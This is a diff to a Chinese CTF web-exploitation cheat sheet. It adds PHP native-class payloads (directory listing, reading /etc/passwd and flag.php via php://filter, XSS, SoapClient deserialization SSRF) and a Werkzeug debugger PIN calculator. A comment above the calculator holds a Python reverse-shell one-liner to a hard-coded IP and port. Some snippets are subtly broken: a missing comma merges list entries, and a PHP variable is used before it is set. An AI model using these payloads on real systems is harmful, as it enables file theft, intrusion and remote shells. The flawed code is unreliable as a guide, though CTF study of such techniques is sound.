@@ -507,6 +507,59 @@ if __name__ == '__main__':
 
 - 打redis
 ## php原生类利用
+```php
+<?php
+
+highlight_file(__FILE__);
+include('flag.php');
+$sys = $_GET['sys'];
+if (preg_match("|flag|", $xsx)) {
+           die("flag is no here!");
+} else {
+    $xsx = $_GET['xsx'];
+    echo new $sys($xsx);
+```
+
+- 读取目录下文件列表
+`sys=GlobIterator&xsx=glob://f*`
+`sys=FilesystemIterator&xsx=glob://f*`
+```php
+<?php
+highlight_file(__FILE__);
+$dir=new DirectoryIterator("../");
+echo $dir;
+```
+
+- 读取文件内容
+```php
+<?php
+highlight_file(__file__);
+$context = new SplFileObject('/etc/passwd');
+foreach($context as $f){
+    echo($f);
+}
+```
+只能读取第一行
+`sys=SplFileObject&xsx=/etc/passwd`
+
+使用filter读取全部内容
+`sys=SplFileObject&xsx=php://filter/convert.base64-encode/resource=flag.php`
+
+- xss
+`sys=SplFileInfo&xsx=<script>alert(1)</script>`
+
+- ssrf
+```php
+<?php
+$a = new SoapClient(null,array('location'=>'http://192.168.61.140:2021/ki10Moc', 'uri'=>'http://192.168.61.140:2021'));
+$b = serialize($a);
+echo $b;
+$c = unserialize($b);
+$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+?>
+```
+
+获取注释内容
 
 
 ## XPATH注入
@@ -625,6 +678,56 @@ if rv is None:
 print(rv)
 ```
 
+
+```python
+# sha1算法，适用于高版本flask
+
+# 无空格Python弹shell
+# python3$IFS-c$IFS'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.23.38",7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
+import hashlib
+from itertools import chain
+probably_public_bits = [
+    '_apt'# /etc/passwd
+    'flask.app',# 默认值
+    'Flask',# 默认值
+    '/usr/local/lib/python3.10/site-packages/flask/app.py' # 报错得到
+]
+
+private_bits = [
+    str(int("a6:37:fe:77:e3:0f".replace(":",""),16)),#  /sys/class/net/eth0/address 16进制转10进制
+    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
+    '96cec10d3d9307792745ec3b85c89620'+'867ab5d2-4e57-4335-811b-2943c662e936'+'0::/system.slice/superpass.service'#  /proc/self/cgroup
+]
+import uuid
+
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+```
 
 # 浏览器控制台上传文件
 ```js
